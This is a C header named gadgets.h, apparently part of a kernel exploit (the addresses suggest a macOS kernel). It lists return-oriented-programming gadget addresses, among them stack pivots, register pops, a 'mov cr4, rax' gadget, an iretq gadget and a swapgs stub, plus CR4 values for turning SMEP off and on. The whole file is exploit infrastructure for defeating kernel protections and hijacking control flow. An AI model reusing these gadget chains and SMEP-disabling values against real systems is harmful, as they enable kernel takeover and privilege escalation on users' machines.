//
//  gadgets.h
//
//  Created by Ilias Morad.
//  Copyright © 2019 Ilias Morad. All rights reserved.
//

#ifndef gadgets_h
#define gadgets_h

                    /* Backup stack pivots */
// 0xffffff80005ea56b: mov esp, 0x5d000000; ret; 
// 0xffffff80008e1834: mov esp, 0x10024; add cl, ch; ret; 
// 0xffffff800060ef11: mov esp, 0xff000000; ret; 
// 0xffffff8000a241ee: xchg esp, esi; dec dword ptr [rax - 0x77]; ret; 

#define ROP_PIVOT_STACK             0xffffff80005ea56b // mov esp, 0x5d000000; ret;
#define ROP_MOV_CR4_RAX             0xffffff800040b613 // mov cr4, rax; ret;
#define ROP_POP_RAX                 0xffffff8000229270 // pop rax; ret; 
#define ROP_POP_RDI                 0xffffff8000228e74 // pop rdi; ret;
#define ROP_POP_RSI                 0xffffff800047c02e // pop rsi; ret; 
#define ROP_POP_RDX                 0xffffff8000273d6f // pop rdx; ret; 
#define ROP_POP_RCX                 0xffffff80007ce67a // pop rcx; ret; 
#define ROP_MOV_RAX_RCX             0xffffff80002e736e // mov rax, rcx; ret;

#define ROP_RET32_IRET              0xffffff80002298bc // iretq

#define CPU_ENABLE_SMEP             0x00000000001606e0
#define CPU_DISABLE_SMEP            0x00000000000606e0


void __attribute__((naked)) swapgs();

#endif